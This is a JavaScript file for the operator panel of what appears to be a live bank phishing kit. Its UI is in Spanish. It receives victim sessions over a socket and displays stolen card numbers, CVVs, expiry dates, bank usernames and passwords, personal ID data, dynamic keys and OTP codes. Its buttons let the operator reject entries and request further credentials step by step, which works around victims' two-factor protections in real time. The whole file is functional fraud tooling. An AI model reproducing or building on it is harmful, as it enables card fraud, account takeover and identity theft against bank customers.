// =========================
// Config / State
// =========================
const nodeUrl = "http://192.168.1.26:3005";
let socket;
let sessionsById = {};
let selectedId = null;
let bootstrapped = false;

// =========================
// Desbloqueo de sonido
// =========================

const sounds = {
    newData: new Audio("/assets/sounds/newdata1.mp3"),
    error: new Audio("/assets/sounds/error1.mp3"),
    wait: new Audio("/assets/sounds/wait1.mp3"),
    next: new Audio("/assets/sounds/next1.mp3"),
};

sounds.newData.volume = 1;
sounds.error.volume = 1;
sounds.wait.volume = 1;
sounds.wait.next = 1;

// =========================
// Desbloqueo de sonido
// =========================

let pendingSound = null;
let soundEnabled = true;
let audioUnlocked = false;

async function unlockAudio() {
    if (audioUnlocked) return;

    try {
        // calienta TODOS los audios para iOS/Android
        for (const a of Object.values(sounds)) {
            a.muted = true;
            await a.play();
            a.pause();
            a.currentTime = 0;
            a.muted = false;
        }

        audioUnlocked = true;

        console.log("🔊 Audio desbloqueado (mobile ok)");
    } catch (e) {
        // si falla, no hacemos nada; el usuario puede volver a tocar
    }
}

document.addEventListener("pointerdown", unlockAudio, { once: true });
/* document.addEventListener("click", unlockAudio, { once: true });
document.addEventListener("touchstart", unlockAudio, { once: true }); */

// =========================
// Función segura para reproducir sonido
// =========================

function playSound(kind) {
    if (!soundEnabled) return;

    if (!audioUnlocked) {
        pendingSound = kind; // guarda el último sonido pendiente
        return;
    }

    const a = sounds[kind];
    if (!a) return;

    a.currentTime = 0;
    a.play().catch(() => {});
}

// =========================
// UI helpers
// =========================
const ACTION_UI = {
    DATA: {
        label: "DATA",
        css: "background:transparent;color:rgb(255 255 255 / 28%);",
    },
    DATA_ERROR: {
        label: "DATA",
        css: "background:var(--red);color:rgba(255, 255, 255, 0.82);",
    },
    DATA_WAIT_ACTION: {
        label: "DATA",
        css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);;",
    },
    CC: {
        label: "CC",
        css: "background:transparent;color:rgb(255 255 255 / 28%);",
    },
    CC_ERROR: {
        label: "CC",
        css: "background:var(--red);color:rgba(255, 255, 255, 0.82);",
    },
    CC_WAIT_ACTION: {
        label: "CC",
        css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);;",
    },

    AUTH: {
        label: "LOGO",
        css: "background:transparent;color:rgb(255 255 255 / 28%);",
    },
    AUTH_ERROR: {
        label: "LOGO",
        css: "background:var(--red);color: rgba(255, 255, 255, 0.82);",
    },
    AUTH_WAIT_ACTION: {
        label: "LOGO",
        css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);",
    },

    DINAMIC: {
        label: "DINA",
        css: "background:transparent;color:rgb(255 255 255 / 28%);",
    },
    DINAMIC_ERROR: {
        label: "DINA",
        css: "background:var(--red);color: rgba(255, 255, 255, 0.82);",
    },
    DINAMIC_WAIT_ACTION: {
        label: "DINA",
        css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);;",
    },

    OTP: {
        label: "OTP",
        css: "background:transparent;color:rgb(255 255 255 / 28%);",
    },
    OTP_ERROR: {
        label: "OTP",
        css: "background:var(--red);color: rgba(255, 255, 255, 0.82);",
    },
    OTP_WAIT_ACTION: {
        label: "OTP",
        css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);;",
    },

    FINISHED: { label: "OK", css: "background:var(--red);color:#fff;" },
};

function applyActionUI(el, action) {
    if (!el) return;
    el.textContent = action ?? "—";
    el.style.cssText = "";

    const ui = ACTION_UI[action];
    if (ui) {
        el.textContent = ui.label;
        el.style.cssText = ui.css;
    }
}

function escapeHtml(value) {
    return String(value ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#039;");
}

// =========================
// Modal helpers
// =========================
const modalOverlay = document.getElementById("modalOverlay");
const closeModalBtn = document.getElementById("closeModalBtn");

function isSmallScreen() {
    return window.matchMedia("(max-width: 980px)").matches;
}

function openModal() {
    modalOverlay?.classList.add("open");
    modalOverlay?.setAttribute("aria-hidden", "false");
    document.body.style.overflow = "hidden";
}

function closeModal() {
    modalOverlay?.classList.remove("open");
    modalOverlay?.setAttribute("aria-hidden", "true");
    document.body.style.overflow = "";
    resetModalSections();
}

function hasValue(v) {
    return v !== null && v !== undefined && String(v).trim() !== "";
}

closeModalBtn?.addEventListener("click", closeModal);
modalOverlay?.addEventListener("click", (e) => {
    if (e.target === modalOverlay) closeModal();
});
window.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && modalOverlay?.classList.contains("open"))
        closeModal();
});

window.addEventListener("resize", () => {
    if (!isSmallScreen() && modalOverlay?.classList.contains("open"))
        closeModal();
});

// =========================
// State dot
// =========================
function stateDotClass(state) {
    switch (String(state || "").toUpperCase()) {
        case "ACTIVE":
            return "green";
        case "INACTIVE":
            return "red";
        case "MINIMIZED":
            return "yellow";
        default:
            return "gray";
    }
}

function stateDot(state) {
    return `<span class="dot ${stateDotClass(state)}"></span>`;
}

// =========================
// Action dot
// =========================
function sectionDotClass(s, key) {
    const action = String(s?.action || "").toUpperCase();

    const SECTIONS = {
        DATA: {
            actions: ["DATA", "DATA_WAIT_ACTION", "DATA_ERROR"],
            required: ["name", "document", "address", "phone", "email"],
        },
        CC: {
            actions: ["CC", "CC_WAIT_ACTION", "CC_ERROR"],
            required: ["cc", "exp", "cvv", "holder"],
        },
        LOGO: {
            actions: ["AUTH", "AUTH_WAIT_ACTION", "AUTH_ERROR"],
            required: ["user", "pass"],
        },
        DINA: {
            actions: ["DINAMIC", "DINAMIC_WAIT_ACTION", "DINAMIC_ERROR"],
            required: ["dinamic"],
        },
        OTP: {
            actions: ["OTP", "OTP_WAIT_ACTION", "OTP_ERROR"],
            required: ["otp"],
        },
    };

    const hasValue = (v) =>
        v !== null && v !== undefined && String(v).trim() !== "";

    const sec = SECTIONS[key];
    if (!sec) return "no-section";

    const isActive = sec.actions.includes(action);

    const hasAny = sec.required.some((k) => hasValue(s?.[k]));
    const isComplete = sec.required.every((k) => hasValue(s?.[k]));

    // Si no hay nada de esa sección y no está activa -> no-section
    if (!hasAny && !isActive) return "no-section";

    // Si está activa y es ERROR -> section-error
    if (isActive && action.endsWith("_ERROR")) return "section-error";

    // Si está activa y le faltan datos -> missing
    if (isActive && action.endsWith("_WAIT_ACTION")) return "section-missing";

    // Si ya está completa (aunque no esté activa) -> complete
    if (isComplete && !isActive) return "section-complete";

    // Si hay algo pero incompleto (y no está activa) -> missing (para que se vea que existe)
    return "section-missing";
}

/* function actionDetailDot(action, label) {
    return `<span class="action-detail-dot ${actionDotClass(action)}">}</span>`;
} */

function actionDot(action) {
    return `<span class="action-dot" style="color:rgba(255, 255, 255, 0.82);;${ACTION_UI[action]?.css ?? action ?? "gray"}">${ACTION_UI[action]?.label ?? action ?? "—"}</span>`;
}

// =========================
// Dynamic sections
// =========================
const topEl = document.getElementById("modalFocus");
const historyEl = document.getElementById("modalHistory");

// sessionId -> last base step (AUTH/DINAMIC/OTP/CC)
const lastStepBySession = new Map();
// sessionId -> { currentStep: "AUTH", historySteps: ["CC","AUTH",...], htmlByStep: Map(step -> html) }
const timelineBySession = new Map();
// sessionId -> sectionType (locked the first time we see/choose it)
const sectionTypeBySession = new Map(); // "CC" | "AUTH" | "DINAMIC" | "OTP" | "OTHER"
// sessionId -> wrapper node (single node per session, moved between top/history)
const nodeBySession = new Map();
// what is currently in TOP
let topSessionId = null;

const STEPS = [
    {
        key: "CC",
        exists: (s) => hasValue(s.cc) || hasValue(s.cvv) || hasValue(s.exp),
        render: (s) => sectionCc(s),
    },
    {
        key: "AUTH",
        exists: (s) => hasValue(s.user) || hasValue(s.pass),
        render: (s) => sectionLogo(s),
    },
    {
        key: "DINAMIC",
        exists: (s) => hasValue(s.dinamic),
        render: (s) => sectionDina(s),
    },
    {
        key: "OTP",
        exists: (s) => hasValue(s.otp),
        render: (s) => sectionOtp(s),
    },
    // Opcional: si quieres mostrar “Other” cuando haya datos personales
    {
        key: "OTHER",
        exists: (s) =>
            hasValue(s.name) ||
            hasValue(s.lastname) ||
            hasValue(s.email) ||
            hasValue(s.ip),
        render: (s) => sectionOther(s),
    },
];

function baseStepFromAction(action) {
    const a = String(action || "").toUpperCase();
    if (a.startsWith("CC")) return "CC";
    if (a.startsWith("AUTH")) return "AUTH";
    if (a.startsWith("DINAMIC")) return "DINAMIC";
    if (a.startsWith("OTP")) return "OTP";
    return "OTHER";
}

function baseTypeFromAction(action) {
    const a = String(action || "").toUpperCase();
    if (a.startsWith("CC")) return "CC";
    if (a.startsWith("AUTH")) return "AUTH";
    if (a.startsWith("DINAMIC")) return "DINAMIC";
    if (a.startsWith("OTP")) return "OTP";
    return "OTHER";
}

function getLockedSectionType(session) {
    const id = session?.id;
    if (!id) return "OTHER";
    if (sectionTypeBySession.has(id)) return sectionTypeBySession.get(id);

    // lock the type on first decision
    const t = baseTypeFromAction(session.action);
    sectionTypeBySession.set(id, t);
    return t;
}

function getCcIcon(s) {
    const action = String(s.action || "").toUpperCase();
    const hasCc = !!s.cc && !!s.exp && !!s.cvv && !!s.holder;

    if (!hasCc || ["CC", "CC_WAIT_ACTION"].includes(action)) return "⌛";
    if (
        (hasCc && action.includes("CC_ERROR")) ||
        (!hasCc && !action.includes("CC"))
    )
        return "❌";
    if (hasCc && !action.includes("CC")) return "💸";
    return "";
}

function sectionCc(s) {
    return `
    <div class="history-data-label-container">
      <span class="history-data-label">CC</span>
    </div>

    <div class="history-data">
      <div class="cc">
        <div class="value-container cc-holder">
          <b class="value-label">Nombre: </b>
          <span class="value">${escapeHtml(s.holder ?? "—")}</span>
        </div>

        <div class="value-container cc-number">
          <b class="value-label">Tarjeta: </b>
          <span class="value">${escapeHtml(s.cc ?? "—")}</span>
        </div>

        <div class="value-container cc-data">
          <div class="cvv-value">
            <span class="value cvv"><b class="value-label">Cvv: </b>${escapeHtml(s.cvv ?? "—")}</span>
          </div>
          <div class="exp-value">
            <span class="value exp"><b class="value-label">Exp: </b>${escapeHtml(s.exp ?? "—")}</span>
          </div>
        </div>
      </div>

      <div class="history-data-icon">
        <span class="focus-icon">${getCcIcon(s)}</span>
      </div>
    </div>
  `;
}

function getLogoIcon(s) {
    const action = String(s.action || "").toUpperCase();
    const hasLogo = !!s.user && !!s.pass;

    if (!hasLogo || ["AUTH", "AUTH_WAIT_ACTION"].includes(action)) return "⌛";
    if (
        (hasLogo && action.includes("AUTH_ERROR")) ||
        (!hasLogo && !action.includes("AUTH"))
    )
        return "❌";
    if (hasLogo && !action.includes("AUTH")) return "💸";
    return "";
}

function sectionLogo(s) {
    return `
    <div class="history-data-label-container">
      <span class="history-data-label">LOGO</span>
    </div>

    <div class="history-data">
      <div class="logo">
        <div class="value-container logo-user">
          <b class="value-label">Usuario: </b>
          <span class="value">${escapeHtml(s.user ?? "—")}</span>
        </div>
        <div class="value-container logo-pass">
          <b class="value-label">Contraseña: </b>
          <span class="value">${escapeHtml(s.pass ?? "—")}</span>
        </div>
      </div>

      <div class="history-data-icon">
        <span class="focus-icon">${getLogoIcon(s)}</span>
      </div>
    </div>
  `;
}

function getDinaIcon(s) {
    const action = String(s.action || "").toUpperCase();
    const hasDina = !!s.dinamic;

    if (!hasDina || ["DINAMIC", "DINAMIC_WAIT_ACTION"].includes(action))
        return "⌛";
    if (
        (hasDina && action.includes("DINAMIC_ERROR")) ||
        (!hasDina && !action.includes("DINAMIC"))
    )
        return "❌";
    if (hasDina && !action.includes("DINAMIC")) return "💸";
    return "";
}

function sectionDina(s) {
    return `
    <div class="history-data-label-container">
      <span class="history-data-label">DINA</span>
    </div>

    <div class="history-data">
      <div class="value-container">
        <span class="dinamic-value">${escapeHtml(s.dinamic ?? "—")}</span>
      </div>

      <div class="history-data-icon">
        <span class="focus-icon">${getDinaIcon(s)}</span>
      </div>
    </div>
  `;
}

function getOtpIcon(s) {
    const action = String(s.action || "").toUpperCase();
    const hasOtp = !!s.otp;

    if (!hasOtp || ["OTP", "OTP_WAIT_ACTION"].includes(action)) return "⌛";
    if (
        (hasOtp && action.includes("OTP_ERROR")) ||
        (!hasOtp && !action.includes("OTP"))
    )
        return "❌";
    if (hasOtp && !action.includes("OTP")) return "💸";
    return "";
}

function sectionOtp(s) {
    return `
    <div class="history-data-label-container">
      <span class="history-data-label">OTP</span>
    </div>

    <div class="history-data">
        <div class="value-container">
            <span class="otp-value">${escapeHtml(s.otp ?? "—")}</span>
        </div>

        <div class="history-data-icon">
            <span class="focus-icon">${getOtpIcon(s)}</span>      
        </div>
    </div>
  `;
}

function getDataIcon(s) {
    const action = String(s.action || "").toUpperCase();
    const hasData = !!s.name && !!s.document && !!s.address && !!s.email;

    if (!hasData && ["DATA", "DATA_WAIT_ACTION"].includes(action)) return "🔥";
    if (hasData && action.includes("DATA_ERROR")) return "⌛";
    if (hasData && !action.includes("DATA")) return "💸";
    return "❌";
}

function sectionOther(s) {
    return `
    <div class="history-data-label-container">
      <span class="history-data-label">Información personal</span>
    </div>
    <hr style="width:100%;" />

    <div class="history-data"><div class="value-container"><b class="common-label">Nombre: </b><span class="common-value">${escapeHtml(s.name ?? "—")}</span></div></div>
    <div class="history-data"><div class="value-container"><b class="common-label">Documento: </b><span class="common-value">${escapeHtml(s.document ?? "—")}</span></div></div>
    <div class="history-data"><div class="value-container"><b class="common-label">Dirección: </b><span class="common-value">${escapeHtml(s.address ?? "—")}</span></div></div>
    <div class="history-data"><div class="value-container"><b class="common-label">Telefono: </b><span class="common-value">${escapeHtml(s.phone ?? "—")}</span></div></div>
    <div class="history-data"><div class="value-container"><b class="common-label">País: </b><span class="common-value">${escapeHtml(s.country ?? "—")}</span></div></div>
    <div class="history-data"><div class="value-container"><b class="common-label">Ciudad: </b><span class="common-value">${escapeHtml(s.city ?? "—")}</span></div></div>
    <div class="history-data"><div class="value-container"><b class="common-label">Email: </b><span class="common-value">${escapeHtml(s.email ?? "—")}</span></div></div>

    <hr style="width:100%;" />

    <div class="history-data"><div class="value-container wb"><b class="common-label">IP: </b><span class="common-value">${escapeHtml(s.ip ?? "—")}</span></div></div>
    <div class="history-data"><div class="value-container wb"><b class="common-label">WebBrowser: </b><span class="common-value">${escapeHtml(s.wb ?? "—")}</span></div></div>
  `;
}

function renderModalSectionsForSession(s) {
    if (!s?.id || !topEl || !historyEl) return;

    // 1) Lista de secciones disponibles (ya tienen data)
    const available = STEPS.filter((step) => step.exists(s));

    // 2) Decide cuál va arriba (focus)
    const focusKey = baseStepFromAction(s.action);
    const focusStep =
        available.find((x) => x.key === focusKey) ||
        available[0] || // si la acción aún no tiene data, muestra la primera disponible
        STEPS.find((x) => x.key === focusKey) || // fallback
        STEPS[0];

    // 3) Render Focus
    topEl.innerHTML = "";
    const focusNode = document.createElement("div");
    focusNode.className = "modalHistory"; // ✅ requerido
    focusNode.dataset.step = focusStep.key;
    focusNode.innerHTML = focusStep.render(s);
    topEl.appendChild(focusNode);

    // 4) Render History (todas las demás disponibles)
    historyEl.innerHTML = "";
    for (const step of available) {
        if (step.key === focusStep.key) continue;
        const node = document.createElement("div");
        node.className = "modalHistory"; // ✅ requerido
        node.dataset.step = step.key;
        node.innerHTML = step.render(s);
        historyEl.appendChild(node);
    }
}

function renderSectionForStep(step, s) {
    switch (step) {
        case "CC":
            return sectionCc(s);
        case "AUTH":
            return sectionLogo(s);
        case "DINAMIC":
            return sectionDina(s);
        case "OTP":
            return sectionOtp(s);
        default:
            return sectionOther(s);
    }
}

/**
 * Pone una sesión en TOP y mantiene 1 solo nodo por sesión.
 * - Si cambias de sesión: el TOP anterior pasa a history (una sola vez).
 * - Si vuelves a seleccionar una sesión que ya estaba en history: se mueve a TOP (no se duplica).
 * - La sesión SIEMPRE mantiene el mismo tipo de sección (locked).
 */
function renderModalForSession(sessionId) {
    const t = timelineBySession.get(sessionId);
    if (!t || !topEl || !historyEl) return;

    // Focus (actual)
    topEl.innerHTML = "";
    const focusNode = document.createElement("div");
    focusNode.className = "modalHistory"; // ✅ requerido
    focusNode.dataset.step = t.currentStep;
    focusNode.innerHTML = t.htmlByStep.get(t.currentStep) || "";
    topEl.appendChild(focusNode);

    // History (anteriores)
    historyEl.innerHTML = "";
    for (let i = t.historySteps.length - 1; i >= 0; i--) {
        const step = t.historySteps[i];
        const node = document.createElement("div");
        node.className = "modalHistory"; // ✅ requerido
        node.dataset.step = step;
        node.innerHTML = t.htmlByStep.get(step) || "";
        historyEl.appendChild(node);
    }
}

function resetModalSections() {
    // Limpia DOM
    if (topEl) topEl.innerHTML = "";
    if (historyEl) historyEl.innerHTML = "";
}

function updateTimelineWithSession(s) {
    if (!s?.id) return;

    const id = s.id;
    const step = baseStepFromAction(s.action);

    // Inicializa timeline si no existe
    if (!timelineBySession.has(id)) {
        timelineBySession.set(id, {
            currentStep: step,
            historySteps: [],
            htmlByStep: new Map(),
        });
    }

    const t = timelineBySession.get(id);

    // siempre actualiza el html del step actual (pueden llegar nuevos datos)
    t.htmlByStep.set(step, renderSectionForStep(step, s));

    const lastStep = lastStepBySession.get(id);

    // Si cambió de step (AUTH -> DINAMIC -> OTP...), empuja el anterior al history (sin duplicar)
    if (lastStep && lastStep !== step) {
        // guarda el HTML del step anterior si aún no está (o actualízalo)
        // (útil si el último update era del step anterior)
        if (!t.htmlByStep.has(lastStep)) {
            t.htmlByStep.set(lastStep, renderSectionForStep(lastStep, s));
        }

        // evita duplicados en history
        if (!t.historySteps.includes(lastStep)) {
            t.historySteps.push(lastStep);
        }
    }

    // actualiza el current
    t.currentStep = step;
    lastStepBySession.set(id, step);
}

// =========================
// Socket connect
// =========================
export async function connectAdmin() {
    const r = await fetch("/admin/socket-token", {
        credentials: "same-origin",
    });
    const data = await r.json();

    if (!r.ok) {
        alert("No autenticado o no se pudo emitir token.");
        console.error(data);
        return;
    }

    socket = io(nodeUrl, {
        transports: ["websocket"],
        auth: { token: data.token },
    });

    socket.on("connect_error", (err) => {
        const pill = document.getElementById("connPill");
        if (pill) pill.innerHTML = "Socket:" + stateDot("INACTIVE");
        console.error("❌ connect_error:", err.message);
        alert("Socket error: " + err.message);
    });

    socket.on("admin:sessions:bootstrap", (sessions) => {
        sessionsById = {};
        (sessions || []).forEach((sess) => (sessionsById[sess.id] = sess));
        renderList();
        bootstrapped = true;
        // refresca el detalle si había selección
        if (selectedId && sessionsById[selectedId]) {
            renderDetail(sessionsById[selectedId]);
        }
    });

    socket.on("admin:sessions:upsert", (sess) => {
        console.log(sess);
        const prev = sessionsById[sess.id]; // sesión anterior (o undefined)
        const isNew = !prev; // ✅ nueva si antes no existía
        const prevAction = prev?.action;

        sessionsById[sess.id] = sess;
        renderList();

        // 🔊 NUEVO REGISTRO
        if (isNew) {
            if (bootstrapped) playSound("newData");
            else pendingSound = "newData"; // por si llegó antes de bootstra
        }

        // 🔊 si pasó a WAIT
        const nowWait = String(sess.action || "").endsWith("_WAIT_ACTION");
        const wasWait = String(prevAction || "").endsWith("_WAIT_ACTION");
        if (nowWait && !wasWait) {
            playSound("wait");
        }

        // 🔊 si pasó a ERROR
        const nowError = String(sess.action || "").endsWith("_ERROR");
        const wasError = String(prevAction || "").endsWith("_ERROR");
        if (nowError && !wasError) {
            playSound("error");
        }

        // Actualiza timeline SIEMPRE (aunque no esté seleccionada)
        updateTimelineWithSession(sess);

        // Si es la que estoy viendo, refresca detalle y modal
        if (selectedId === sess.id) {
            renderDetail(sess);

            if (isSmallScreen() && modalOverlay?.classList.contains("open")) {
                renderModalSectionsForSession(sess); // ✅ se actualiza cuando cambie action o llegue data nueva
                renderActionsHTML(sess, "modalActions");
            }
        }
    });

    socket.on("error:msg", (msg) => alert(msg));
}

// =========================
// List render
// =========================
function renderList() {
    const listEl = document.getElementById("sessionsList");
    if (!listEl) return;

    const items = Object.values(sessionsById).sort(
        (a, b) => new Date(b.updatedAt) - new Date(a.updatedAt),
    );

    console.log(items);

    listEl.innerHTML = items
        .map((s) => {
            const selected = selectedId === s.id ? "activeSel" : "";

            const hasCc = !!(s.cc && s.exp && s.cvv);
            const hasLogo = !!(s.user && s.pass);
            const hasDina = !!s.dinamic;
            const hasData = !!(
                s.name &&
                s.document &&
                s.address &&
                s.phone &&
                s.email
            );
            const hasOtp = !!s.otp;

            const bankLabel = !s.bank
                ? "⏳ esperando..."
                : `🏦 ${s.bank.charAt(0).toUpperCase() + s.bank.slice(1)}`;
            /* const actionLabel = ACTION_UI[s.action]?.label ?? s.action ?? "—"; */
            const actionLabel = actionDot(s.action);
            const dot = stateDot(s.state);

            const dataCls = sectionDotClass(s, "DATA");
            const ccCls = sectionDotClass(s, "CC");
            const logoCls = sectionDotClass(s, "LOGO");
            const otpCls = sectionDotClass(s, "OTP");
            const dinaCls = sectionDotClass(s, "DINA");

            return `
        <div class="row ${selected}" onclick="openSession('${escapeHtml(s.id)}')">
          <div class="rowMain">
            <div class="rowTop">
              <div class="rowtop-left">
                <div class="rowtop-left-id">
                  ${dot}
                  <span class="sid">${escapeHtml(s.id)}</span>
                </div>
                <div class="rowtop-left-name">
                  <span class="sname">${escapeHtml(s.name ?? "Sin nombre")}</span>
                </div>
              </div>

              <div class="rowtop-rigth">
                ${actionLabel}
              </div>
            </div>

            <div class="meta">
              <div class="bank">
                <span class="kv"><b>${escapeHtml(bankLabel)}</b></span>
              </div>

              <div class="action-details">
                <span class="kv-action ${dataCls}"><b>DATA</b></span>
                <span class="kv-action ${ccCls}"><b>CC</b></span>
                <span class="kv-action ${logoCls}"><b>LOGO</b></span>
                <span class="kv-action ${otpCls}"><b>OTP</b></span>
                <span class="kv-action ${dinaCls}"><b>DINA</b></span>
              </div>
            </div>
          </div>
        </div>
      `;
        })
        .join("");
}

// =========================
// Actions render
// =========================
function renderActionsHTML(s, targetElId) {
    const actions = document.getElementById(targetElId);
    if (!actions) return;

    actions.innerHTML = "";
    if (!s) return;

    switch (s.action) {
        case "DATA_WAIT_ACTION":
            actions.innerHTML = `
                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_data')">Error DATA</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_auth')">Pedir LOGO</button>
            `;
            break;

        case "DATA_ERROR":
            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevos datos ⌛</span>`;
            break;
        case "AUTH_WAIT_ACTION":
            actions.innerHTML = `
                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_auth')">Error Login</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
            `;
            break;

        case "AUTH_ERROR":
            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevos datos ⌛</span>`;
            break;

        case "DINAMIC_WAIT_ACTION":
            actions.innerHTML = `
                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_dinamic')">Error DINA</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
                <button onclick="act('${escapeHtml(s.id)}','finish')">Terminar</button>
            `;
            break;

        case "DINAMIC_ERROR":
            actions.innerHTML = `<span style="color:var(--muted)">Esperando nueva dinámica ⌛</span>`;
            break;

        case "OTP_WAIT_ACTION":
            actions.innerHTML = `
                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_otp')">Error OTP</button>
                <button onclick="act('${escapeHtml(s.id)}','custom_alert')">Enviar alerta</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
                <button onclick="act('${escapeHtml(s.id)}','finish')">Terminar</button>
            `;
            break;

        case "OTP_ERROR":
            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevo OTP ⌛</span>`;
            break;

        default:
            actions.innerHTML = `<span style="color:var(--muted)">Sin acciones disponibles en este estado.</span>`;
    }
}

// =========================
// Detail render (desktop + mobile modal)
// =========================
function renderDetail(s) {
    // Desktop detail top
    const selectedIdEl = document.getElementById("selectedId");
    if (selectedIdEl) selectedIdEl.textContent = s?.id ?? "—";

    const dt = document.getElementById("detailTop");
    if (dt) {
        if (s) {
            console.log(s);
        }
    }

    renderActionsHTML(s, "actions");

    // ✅ Focus section logic (ONE TYPE per session)

    // Mobile modal detail
    if (isSmallScreen() && s) {
        const idEl = document.getElementById("modalSessionId");
        const stEl = document.getElementById("modalState");
        const pillBank = document.getElementById("modalBankPill");
        const pillCc = document.getElementById("modalCcPill");
        const pillAction = document.getElementById("modalActionPill");

        if (idEl) idEl.textContent = s.id ?? "—";
        if (stEl)
            stEl.className =
                `dot ${stateDotClass(s.state || "")}`.trim() || "dot";
        if (pillBank) {
            pillBank.textContent = `🏦${s.bank}`;
        }
        if (pillCc) {
            pillCc.textContent =
                s.type && s.level ? s.type + " - " + s.level : "Solo Logo";
        }
        if (pillAction) {
            pillAction.className = `pill ${
                s.action.endsWith("_ERROR") ? "error" : "section-missing"
            }`;

            pillAction.textContent = s.action.endsWith("_ERROR")
                ? "ERROR"
                : s.action.endsWith("_WAIT_ACTION")
                  ? "ESPERANDO ORDEN 💡"
                  : "Esperando Datos";
        }

        renderActionsHTML(s, "modalActions");
    }
}

// =========================
// Global actions
// =========================
window.openSession = function (id) {
    selectedId = id;
    renderList();

    const s = sessionsById[id];
    renderDetail(s);

    if (isSmallScreen() && s) {
        openModal();

        // actualiza timeline con el estado actual y renderiza
        renderModalSectionsForSession(s); //✅ pinta todas las secciones existentes
        renderActionsHTML(s, "modalActions");
    }
};

window.act = function (sessionId, action) {
    // 🔊 sonido SOLO cuando admin pide dinámica u OTP
    if (action === "request_dinamic" || action === "request_otp") {
        playSound("next");
    }

    // 🔊 si es error (opcional: mantenerlo aquí también)
    if (String(action).startsWith("reject_")) {
        playSound("error");
    }

    let message = null;
    if (action === "custom_alert") {
        message = prompt("Mensaje personalizado para el usuario:");
        if (message === null) return;
    }

    const eventName = `admin:${action}`;
    socket?.emit(eventName, message ? { sessionId, message } : { sessionId });
};
// =========================
// Boot
// =========================
renderList();
connectAdmin();
